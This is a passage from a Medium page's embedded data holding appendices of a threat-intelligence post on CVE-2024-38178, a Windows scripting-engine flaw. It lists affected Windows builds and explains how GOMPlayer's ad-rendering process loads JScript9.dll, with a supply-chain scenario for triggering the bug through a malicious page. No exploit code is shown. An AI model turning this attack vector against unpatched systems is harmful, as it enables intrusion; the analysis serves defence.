years.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_125":{"__typename":"Paragraph","id":"c4f3422a977b_125","name":"264a","type":"H3","href":null,"layout":null,"metadata":null,"text":"Appendix B. Affected Windows versions","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_126":{"__typename":"Paragraph","id":"c4f3422a977b_126","name":"2c9c","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows Server 2022, 23H2 Edition \u003C 10.0.25398.1085","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_127":{"__typename":"Paragraph","id":"c4f3422a977b_127","name":"bc07","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 10 for 32-bit Systems \u003C 10.0.10240.20751","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_128":{"__typename":"Paragraph","id":"c4f3422a977b_128","name":"4535","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 11 Version 23H2 for x64-based Systems \u003C 10.0.22631.4037","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_129":{"__typename":"Paragraph","id":"c4f3422a977b_129","name":"654d","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 11 Version 23H2 for ARM64-based Systems \u003C 10.0.22631.4037","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_130":{"__typename":"Paragraph","id":"c4f3422a977b_130","name":"24f1","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 10 Version 22H2 for 32-bit Systems \u003C 10.0.19045.4780","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_131":{"__typename":"Paragraph","id":"c4f3422a977b_131","name":"66b4","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 10 Version 22H2 for ARM64-based Systems \u003C 10.0.19045.4780","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_132":{"__typename":"Paragraph","id":"c4f3422a977b_132","name":"3274","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows Server 2012 R2 \u003C 6.3.9600.22134\u002F1.001","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_133":{"__typename":"Paragraph","id":"c4f3422a977b_133","name":"7876","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows Server 2016 \u003C 10.0.14393.7259","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_134":{"__typename":"Paragraph","id":"c4f3422a977b_134","name":"e25e","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 10 Version 1607 for x64-based Systems \u003C 10.0.14393.7259","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_135":{"__typename":"Paragraph","id":"c4f3422a977b_135","name":"74f7","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 10 Version 1607 for 32-bit Systems \u003C 10.0.14393.7259","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_136":{"__typename":"Paragraph","id":"c4f3422a977b_136","name":"4105","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 10 for x64-based Systems \u003C 10.0.10240.20751","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_137":{"__typename":"Paragraph","id":"c4f3422a977b_137","name":"3975","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 10 Version 22H2 for x64-based Systems \u003C 10.0.19045.4780","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_138":{"__typename":"Paragraph","id":"c4f3422a977b_138","name":"12b0","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 11 Version 22H2 for x64-based Systems \u003C 10.0.22621.4037","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_139":{"__typename":"Paragraph","id":"c4f3422a977b_139","name":"ac71","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 11 Version 22H2 for ARM64-based Systems \u003C 10.0.22621.4037","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_140":{"__typename":"Paragraph","id":"c4f3422a977b_140","name":"dad6","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 10 Version 21H2 for x64-based Systems \u003C 10.0.19044.4780","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_141":{"__typename":"Paragraph","id":"c4f3422a977b_141","name":"6eee","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 10 Version 21H2 for ARM64-based Systems \u003C 10.0.19044.4780","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_142":{"__typename":"Paragraph","id":"c4f3422a977b_142","name":"137e","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 10 Version 21H2 for 32-bit Systems \u003C 10.0.19044.4780","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_143":{"__typename":"Paragraph","id":"c4f3422a977b_143","name":"7b3a","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 11 version 21H2 for ARM64-based Systems \u003C 10.0.22000.3147","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_144":{"__typename":"Paragraph","id":"c4f3422a977b_144","name":"3db6","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 11 version 21H2 for x64-based Systems \u003C 10.0.22000.3147","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_145":{"__typename":"Paragraph","id":"c4f3422a977b_145","name":"a2f8","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows Server 2022 \u003C 10.0.20348.2655","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_146":{"__typename":"Paragraph","id":"c4f3422a977b_146","name":"e113","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows Server 2019 \u003C 10.0.17763.6189","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_147":{"__typename":"Paragraph","id":"c4f3422a977b_147","name":"c4cd","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 10 Version 1809 for x64-based Systems \u003C 10.0.17763.6189","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_148":{"__typename":"Paragraph","id":"c4f3422a977b_148","name":"bd1d","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 10 Version 1809 for 32-bit Systems \u003C 10.0.17763.6189","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_149":{"__typename":"Paragraph","id":"c4f3422a977b_149","name":"4402","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 11 Version 24H2 for x64-based Systems \u003C 10.0.26100.1457","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_150":{"__typename":"Paragraph","id":"c4f3422a977b_150","name":"bfa8","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Windows 11 Version 24H2 for ARM64-based Systems \u003C 10.0.26100.1457","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_151":{"__typename":"Paragraph","id":"c4f3422a977b_151","name":"f4f3","type":"H3","href":null,"layout":null,"metadata":null,"text":"Appendix C. Affected product — GOMPlayer","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_152":{"__typename":"Paragraph","id":"c4f3422a977b_152","name":"9589","type":"P","href":null,"layout":null,"metadata":null,"text":"The Toast.gom process renders web-hosted ad pages via Toast Notification and loads JScript9.dll as the JavaScript execution engine.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":54,"end":72,"href":"https:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fwindows\u002Fapps\u002Fdesign\u002Fshell\u002Ftiles-and-notifications\u002Ftoast-notifications-overview","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":4,"end":13,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*I0hGEC0w9_EgnSucsmko5g.png":{"__typename":"ImageMetadata","id":"1*I0hGEC0w9_EgnSucsmko5g.png","originalHeight":752,"originalWidth":1463,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_153":{"__typename":"Paragraph","id":"c4f3422a977b_153","name":"33c6","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*I0hGEC0w9_EgnSucsmko5g.png"},"text":"Figure 15. Toast.com process loading JScript9.dll","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_154":{"__typename":"Paragraph","id":"c4f3422a977b_154","name":"8c91","type":"P","href":null,"layout":null,"metadata":null,"text":"The following URL was passed among the command line arguments passed to that process.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_155":{"__typename":"Paragraph","id":"c4f3422a977b_155","name":"432c","type":"ULI","href":null,"layout":null,"metadata":null,"text":"https[:]\u002F\u002Fmini.gomlab.com\u002Fplayer\u002Fhtml\u002Ftoast\u002Ftoast_KR_N.html","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*hLW5mR-Y6SaDYdqhKA8UQg.png":{"__typename":"ImageMetadata","id":"1*hLW5mR-Y6SaDYdqhKA8UQg.png","originalHeight":376,"originalWidth":1479,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_156":{"__typename":"Paragraph","id":"c4f3422a977b_156","name":"8972","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*hLW5mR-Y6SaDYdqhKA8UQg.png"},"text":"Figure 16. URLs passed as command line arguments","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_157":{"__typename":"Paragraph","id":"c4f3422a977b_157","name":"bf04","type":"P","href":null,"layout":null,"metadata":null,"text":"On that URL page, JavaScript code is present to monitor events such as ad impressions and the Toast.gom process interprets the JavaScript code in the JScript9.dll engine.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":94,"end":103,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Xgbitn4IN5cCH3Oc14IZLg.png":{"__typename":"ImageMetadata","id":"1*Xgbitn4IN5cCH3Oc14IZLg.png","originalHeight":749,"originalWidth":1218,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_158":{"__typename":"Paragraph","id":"c4f3422a977b_158","name":"500a","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Xgbitn4IN5cCH3Oc14IZLg.png"},"text":"Figure 17. Javascript embedded in an ad page","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_159":{"__typename":"Paragraph","id":"c4f3422a977b_159","name":"c45a","type":"P","href":null,"layout":null,"metadata":null,"text":"A supply chain attack scenario using phishing domain hosting could trigger the vulnerability of the Toast.gom process renders a malicious web page.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":100,"end":109,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*dmM2PUKU_P8gJqIEcfh2yw.png":{"__typename":"ImageMetadata","id":"1*dmM2PUKU_P8gJqIEcfh2yw.png","originalHeight":639,"originalWidth":1445,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_160":{"__typename":"Paragraph","id":"c4f3422a977b_160","name":"5051","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*dmM2PUKU_P8gJqIEcfh2yw.png"},"text":"Figure 18. Vulnerability triggered by passing a URL with malicious javascript as an argument","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"CollectionViewerEdge:collectionId:30a8766b5c42-viewerId:lo_335d62ef07dd":{"__typename":"CollectionViewerEdge","id":"collectionId:30a8766b5c42-viewerId:lo_335d62ef07dd","isEditor":false,"isMuting":false},"ImageMetadata:1*dAAOzI0wCWzr0K3RGg2Pzw.png":{"__typename":"ImageMetadata","id":"1*dAAOzI0wCWzr0K3RGg2Pzw.png","originalWidth":500,"originalHeight":500},"PostViewerEdge:postId:91ad954dbf83-viewerId:lo_335d62ef07dd":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:91ad954dbf83-viewerId:lo_335d62ef07dd"},"Tag:threat-intelligence":{"__typename":"Tag","id":"threat-intelligence","displayTitle":"Threat Intelligence","normalizedTagSlug":"threat-intelligence"},"Tag:apt37":{"__typename":"Tag","id":"apt37","displayTitle":"Apt37","normalizedTagSlug":"apt37"},"Tag:scarcruft":{"__typename":"Tag","id":"scarcruft","displayTitle":"Scarcruft","normalizedTagSlug":"scarcruft"},"Tag:cve-2024-38178":{"__typename":"Tag","id":"cve-2024-38178","displayTitle":"Cve 2024 38178","normalizedTagSlug":"cve-2024-38178"},"Tag:vulnerability":{"__typename":"Tag","id":"vulnerability","displayTitle":"Vulnerability","normalizedTagSlug":"vulnerability"},"Post:91ad954dbf83":{"__typename":"Post","id":"91ad954dbf83","collection":{"__ref":"Collection:30a8766b5c42"},"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"8afb","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:c4f3422a977b_0"},{"__ref":"Paragraph:c4f3422a977b_1"},{"__ref":"Paragraph:c4f3422a977b_2"},{"__ref":"Paragraph:c4f3422a977b_3"},{"__ref":"Paragraph:c4f3422a977b_4"},{"__ref":"Paragraph:c4f3422a977b_5"},{"__ref":"Paragraph:c4f3422a977b_6"},{"__ref":"Paragraph:c4f3422a977b_7"},{"__ref":"Paragraph:c4f3422a977b_8"},{"__ref":"Paragraph:c4f3422a977b_9"},{"__ref":"Paragraph:c4f3422a977b_10"},{"__ref":"Paragraph:c4f3422a977b_11"},{"__ref":"Paragraph:c4f3422a977b_12"},{"__ref":"Paragraph:c4f3422a977b_13"},{"__ref":"Paragraph:c4f3422a977b_14"},{"__ref":"Paragraph:c4f3422a977b_15"},{"__ref":"Paragraph:c4f3422a977b_16"},{"__ref":"Paragraph:c4f3422a977b_17"},{"__ref":"Paragraph:c4f3422a977b_18"},{"__ref":"Paragraph:c4f3422a977b_19"},{"__ref":"Paragraph:c4f3422a977b_20"},{"__ref":"Paragraph:c4f3422a977b_21"},{"__ref":"Paragraph:c4f3422a977b_22"},{"__ref":"Paragraph:c4f3422a977b_23"},{"__ref":"Paragraph:c4f3422a977b_24"},{"__ref":"Paragraph:c4f3422a977b_25"},{"__ref":"Paragraph:c4f3422a977b_26"},{"__ref":"Paragraph:c4f3422a977b_27"},{"__ref":"Paragraph:c4f3422a977b_28"},{"__ref":"Paragraph:c4f3422a977b_29"},{"__ref":"Paragraph:c4f3422a977b_30"},{"__ref":"Paragraph:c4f3422a977b_31"},{"__ref":"Paragraph:c4f3422a977b_32"},{"__ref":"Paragraph:c4f3422a977b_33"},{"__ref":"Paragraph:c4f3422a977b_34"},{"__ref":"Paragraph:c4f3422a977b_35"},{"__ref":"Paragraph:c4f3422a977b_36"},{"__ref":"Paragraph:c4f3422a977b_37"},{"__ref":"Paragraph:c4f3422a977b_38"},{"__ref":"Paragraph:c4f3422a977b_39"},{"__ref":"Paragraph:c4f3422a977b_40"},{"__ref":"Paragraph:c4f3422a977b_41"},{"__ref":"Paragraph:c4f3422a977b_42"},{"__ref":"Paragraph:c4f3422a977b_43"},{"__ref":"Paragraph:c4f3422a977b_44"},{"__ref":"Paragraph:c4f3422a977b_45"},{"__ref":"Paragraph:c4f3422a977b_46"},{"__ref":"Paragraph:c4f3422a977b_47"},{"__ref":"Paragraph:c4f3422a977b_48"},{"__ref":"Paragraph:c4f3422a977b_49"},{"__ref":"Paragraph:c4f3422a977b_50"},{"__ref":"Paragraph:c4f3422a977b_51"},{"__ref":"Paragraph:c4f3422a977b_52"},{"__ref":"Paragraph:c4f3422a977b_53"},{"__ref":"Paragraph:c4f3422a977b_54"},{"__ref":"Paragraph:c4f3422a977b_55"},{"__ref":"Paragraph:c4f3422a977b_56"},{"__ref":"Paragraph:c4f3422a977b_57"},{"__ref":"Paragraph:c4f3422a977b_58"},{"__ref":"Paragraph:c4f3422a977b_59"},{"__ref":"Paragraph:c4f3422a977b_60"},{"__ref":"Paragraph:c4f3422a977b_61"},{"__ref":"Paragraph:c4f3422a977b_62"},{"__ref":"Paragraph:c4f3422a977b_63"},{"__ref":"Paragraph:c4f3422a977b_64"},{"__ref":"Paragraph:c4f3422a977b_65"},{"__ref":"Paragraph:c4f3422a977b_66"},{"__ref":"Paragraph:c4f3422a977b_67"},{"__ref":"Paragraph:c4f3422a977b_68"},{"__ref":"Paragraph:c4f3422a977b_69"},{"__ref":"Paragraph:c4f3422a977b_70"},{"__ref":"Paragraph:c4f3422a977b_71"},{"__ref":"Paragraph:c4f3422a977b_72"},{"__ref":"Paragraph:c4f3422a977b_73"},{"__ref":"Paragraph:c4f3422a977b_74"},{"__ref":"Paragraph:c4f3422a977b_75"},{"__ref":"Paragraph:c4f3422a977b_76"},{"__ref":"Paragraph:c4f3422a977b_77"},{"__ref":"Paragraph:c4f3422a977b_78"},{"__ref":"Paragraph:c4f3422a977b_79"},{"__ref":"Paragraph:c4f3422a977b_80"},{"__ref":"Paragraph:c4f3422a977b_81"},{"__ref":"Paragraph:c4f3422a977b_82"},{"__ref":"Paragraph:c4f3422a977b_83"},{"__ref":"Paragraph:c4f3422a977b_84"},{"__ref":"Paragraph:c4f3422a977b_85"},{"__ref":"Paragraph:c4f3422a977b_86"},{"__ref":"Paragraph:c4f3422a977b_87"},{"__ref":"Paragraph:c4f3422a977b_88"},{"__ref":"Paragraph:c4f3422a977b_89"},{"__ref":"Paragraph:c4f3422a977b_90"},{"__ref":"Paragraph:c4f3422a977b_91"},{"__ref":"Paragraph:c4f3422a977b_92"},{"__ref":"Paragraph:c4f3422a977b_93"},{"__ref":"Paragraph:c4f3422a977b_94"},{"__ref":"Paragraph:c4f3422a977b_95"},{"__ref":"Paragraph:c4f3422a977b_96"},{"__ref":"Paragraph:c4f3422a977b_97"},{"__ref":"Paragraph:c4f3422a977b_98"},{"__ref":"Paragraph:c4f3422a977b_99"},{"__ref":"Paragraph:c4f3422a977b_100"},{"__ref":"Paragraph:c4f3422a977b_101"},{"__ref":"Paragraph:c4f3422a977b_102"},{"__ref":"Paragraph:c4f3422a977b_103"},{"__ref":"Paragraph:c4f3422a977b_104"},{"__ref":"Paragraph:c4f3422a977b_105"},{"__ref":"Paragraph:c4f3422a977b_106"},{"__ref":"Paragraph:c4f3422a977b_107"},{"__ref":"Paragraph:c4f3422a977b_108"},{"__ref":"Paragraph:c4f3422a977b_109"},{"__ref":"Paragraph:c4f3422a977b_110"},{"__ref":"Paragraph:c4f3422a977b_111"},{"__ref":"Paragraph:c4f3422a977b_112"},{"__ref":"Paragraph:c4f3422a977b_113"},{"__ref":"Paragraph:c4f3422a977b_114"},{"__ref":"Paragraph:c4f3422a977b_115"},{"__ref":"Paragraph:c4f3422a977b_116"},{"__ref":"Paragraph:c4f3422a977b_117"},{"__ref":"Paragraph:c4f3422a977b_118"},{"__ref":"Paragraph:c4f3422a977b_119"},{"__ref":"Paragraph:c4f3422a977b_120"},{"__ref":"Paragraph:c4f3422a977b_121"},{"__ref":"Paragraph:c4f3422a977b_122"},{"__ref":"Paragraph:c4f3422a977b_123"},{"__ref":"Paragraph:c4f3422a977b_124"},{"__ref":"Paragraph:c4f3422a977b_125"},{"__ref":"Paragraph:c4f3422a977b_126"},{"__ref":"Paragraph:c4f3422a977b_127"},{"__ref":"Paragraph:c4f3422a977b_128"},{"__ref":"Paragraph:c4f3422a977b_129"},{"__ref":"Paragraph:c4f3422a977b_130"},{"__ref":"Paragraph:c4f3422a977b_131"},{"__ref":"Paragraph:c4f3422a977b_132"},{"__ref":"Paragraph:c4f3422a977b_133"},{"__ref":"Paragraph:c4f3422a977b_134"},{"__ref":"Paragraph:c4f3422a977b_135"},{"__ref":"Paragraph:c4f3422a977b_136"},{"__ref":"Paragraph:c4f3422a977b_137"},{"__ref":"Paragraph:c4f3422a977b_138"},{"__ref":"Paragraph:c4f3422a977b_139"},{"__ref":"Paragraph:c4f3422a977b_140"},{"__ref":"Paragraph:c4f3422a977b_141"},{"__ref":"Paragraph:c4f3422a977b_142"},{"__ref":"Paragraph:c4f3422a977b_143"},{"__ref":"Paragraph:c4f3422a977b_144"},{"__ref":"Paragraph:c4f3422a977b_145"},{"__ref":"Paragraph:c4f3422a977b_146"},{"__ref":"Paragraph:c4f3422a977b_147"},{"__ref":"Paragraph:c4f3422a977b_148"},{"__ref":"Paragraph:c4f3422a977b_149"},{"__ref":"Paragraph:c4f3422a977b_150"},{"__ref":"Paragraph:c4f3422a977b_151"},{"__ref":"Paragraph:c4f3422a977b_152"},{"__ref":"Paragraph:c4f3422a977b_153"},{"__ref":"Paragraph:c4f3422a977b_154"},{"__ref":"Paragraph:c4f3422a977b_155"},{"__ref":"Paragraph:c4f3422a977b_156"},{"__ref":"Paragraph:c4f3422a977b_157"},{"__ref":"Paragraph:c4f3422a977b_158"},{"__ref":"Paragraph:c4f3422a977b_159"},{"__ref":"Paragraph:c4f3422a977b_160"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:b408bb1e7c46"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fmedium.com\u002Fs2wblog\u002Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"}],"isPublished":true,"latestPublishedVersion":"c4f3422a977b","visibility":"PUBLIC","postResponses":{"__typename":"PostResponses","count":0},"clapCount":28,"allowResponses":true,"isLimitedState":false,"title":"Unmasking CVE-2024-38178: The Silent Threat of Windows Scripting Engine","isSeries":false,"sequence":null,"uniqueSlug":"unmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1729080314998,"readingTime":16.266037735849057,"previewContent":{"__typename":"PreviewContent","subtitle":"Author: Hosu Choi, Minyeop Choi | S2W Talon"},"previewImage":{"__ref":"ImageMetadata:1*buHo6ydCb774gg64BFVRog.png"},"isShortform":false,"seoTitle":"","firstPublishedAt":1729078495996,"updatedAt":1729082126224,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:91ad954dbf83-viewerId:lo_335d62ef07dd"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:threat-intelligence"},{"__ref":"Tag:apt37"},{"__ref":"Tag:scarcruft"},{"__ref":"Tag:cve-2024-38178"},{"__ref":"Tag:vulnerability"}],"isNewsletter":false,"statusForCollection":"APPROVED","pendingCollection":null,"detectedLanguage":"en","wordCount":3860,"layerCake":0}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"HIT"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.7e50e797.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.018e7ca9.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.d9108df7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9120.5df29668.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4810.6318add7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1386.6a7a21a1.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.84e4bd5c.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/719.ae4dd3e0.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5250.9f9e01d2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6349.b071a958.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.826a25fb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1443.598cb8b2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3735.8c38ede2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.d10c9ba0.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.cd03f950.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.08de95de.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1781.db373833.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2420.0330d157.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.ca7937c2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.d195c6f1.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2106.21ff89d3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7394.55c925ce.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2961.00a48598.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/230.4d7a2738.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4391.59acaed3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.563d0db5.chunk.js"></script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8d764d369b53e2d0',t:'MTcyOTczNDQ3NS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body></html>